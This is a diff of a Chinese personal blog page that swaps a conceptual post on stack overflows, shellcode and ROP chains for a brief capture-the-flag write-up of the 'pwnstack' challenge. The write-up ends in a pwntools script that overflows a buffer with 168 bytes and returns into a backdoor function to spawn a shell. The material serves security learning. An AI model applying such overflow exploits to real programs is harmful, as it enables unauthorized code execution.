@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="栈溢出、rop链、shellcode原理解析, 矢坕个人博客">
+    <meta name="keywords" content="浅尝pwn题：pwnstack, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>栈溢出、rop链、shellcode原理解析 | 矢坕个人博客</title>
+    <title>浅尝pwn题：pwnstack | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">栈溢出、rop链、shellcode原理解析</h1>
+                    <h1 class="description center-align post-title">浅尝pwn题：pwnstack</h1>
                 </div>
             </div>
         </div>
@@ -443,28 +443,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-21
+                    2022-12-24
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-21
+                    2022-12-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    710
+                    273
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -482,9 +482,13 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="shellcode原理："><a href="#shellcode原理：" class="headerlink" title="shellcode原理："></a>shellcode原理：</h1><p>shellcode通常使用机器语言编写，是一段用于利用软件漏洞而执行的代码其目的常常让攻击者获得目标机器的命令行shell而得名。<br>shellcode根据他是攻击者控制他所运行的机器，还是通过网络控制另一台机器，可以分为本地和远程两种类型有时攻击者注入目标进程中的字节数是被限制的，因此可以将shellcode分阶段进行，由前一阶段比较简短的shellcode将后一阶段比较复杂的shellcode下载并执行。</p>
-<h1 id="栈溢出原理："><a href="#栈溢出原理：" class="headerlink" title="栈溢出原理："></a>栈溢出原理：</h1><p>由于C语言对数组引用不做任何边界的检查，从而导致缓冲区溢出（<em>buffer overflow</em>）成为一种常见的漏洞。根据溢出发生的内存位置，通常可以分为栈溢出和堆溢出。由于栈上保存着局部变量和一些状态信息，一旦发生严重的溢出，攻击者就可以通过复盖返回地址来执行任意代码，利用方法包括shellcode注入、ret2libc、rop等。<br>在之前的博客中有提到，<strong>函数以栈的形式调用</strong>，在每个栈的底部有rbp指针和我们的返回地址，如果溢出<strong>足够多</strong>的字节，就可以将rbp指针和返回地址给<strong>覆盖</strong>，当函数执行到返回地址时就可以按照我们所设计好的地址<strong>跳跃</strong>到目标函数继续执行获得shell。</p>
-<h1 id="rop链原理："><a href="#rop链原理：" class="headerlink" title="rop链原理："></a>rop链原理：</h1><p>对于rop原理我学得磕磕碰碰，（老师讲得有点模糊）主要是一个地方没讲好，希望后来人别被卡住。<br>最开始要利用栈溢出，只需要将返回地址覆盖为jmp esp的指令地址，并在后面添加shellcode就可以执行 后来引入了NX缓解机制，数据的所在内存页被标记为不可执行此时再执行shellcode就会抛出异常，所以注入新的代码并不可行，那么就复用程序中已有的代码。<br>于是rop链技术就诞生了使用rop链就要先扫描文件，提取出可用的gadget片段（通常以ret指令结尾）<strong>的地址</strong>（划重点），然后将这些gadget根据需要的功能进行组合达到攻击者的目的（刚开始老师没讲清楚是<strong>地址</strong>，导致我一直在自己猜想怎么拼接的）。<br>这里附一张图更好理解：<br><img src="/images/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.webp" alt="1"><br>也就是覆盖返回地址为gadget的地址，跳到gadget片段上执行在此gadget的地址下附上另一个gadget的地址，以此类推连成rop链。<br>如图pop rdi完rsp向下跳一格，并继续执行return指令实现&#x2F;bin&#x2F;sh_的函数调用获取shell。</p>
+                <h2 id="pwnstack-wp"><a href="#pwnstack-wp" class="headerlink" title="pwnstack wp"></a>pwnstack wp</h2><p>这题pwn是我看wp写出来的，一个晚上的琢磨感觉网上的wp还是不够简洁，于是乎我自己来总结一下：<br>首先从网站上下载压缩包解压后放至自己虚拟机的文件夹中；<br>发现它是个64位二进制文件：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/1.png"><br>对其进行checksec下如下图：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/2.png"><br>发现只有NX保护打开。<br>在物理机上将它拖进IDA中分析：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/3.png"><br>对其中的函数双击点进去，发现vul函数中有read函数可读取177个字节，而我们定义的buf只有160个字节，很明显是个栈溢出题目。<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/4.png"><br>然后我们在这列中找到了后门函数：backdoor<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/5.png"><br>进去看发现它可以直接调用&#x2F;bin&#x2F;sh获得shell：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/6.png"><br>接下来就是编写脚本了，因为要覆盖到返回地址只要将buf区填满和rbp指针覆盖共需要168个字节于是我们填充168个a，后面返回地址则覆盖为backdoor的地址即可</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">168</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400762</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获取shell</p>
 
                 
             </div>
@@ -511,7 +515,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">http://airunfive.github.io/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</a>
+                    <a href="http://airunfive.github.io/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/">http://airunfive.github.io/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -716,54 +720,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/23/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86/">
+                <a href="/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="栈转移原理">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="浅尝pwn题：pwnstack">
                         
-                        <span class="card-title">栈转移原理</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-23
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            矢坕
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="函数的调用和约定">
-                        
-                        <span class="card-title">函数的调用和约定</span>
+                        <span class="card-title">浅尝pwn题：pwnstack</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -774,7 +742,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            矢坕
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="pwntools的基本语法">
+                        
+                        <span class="card-title">pwntools的基本语法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-24
                             </span>
                         <span class="publish-author">
                             
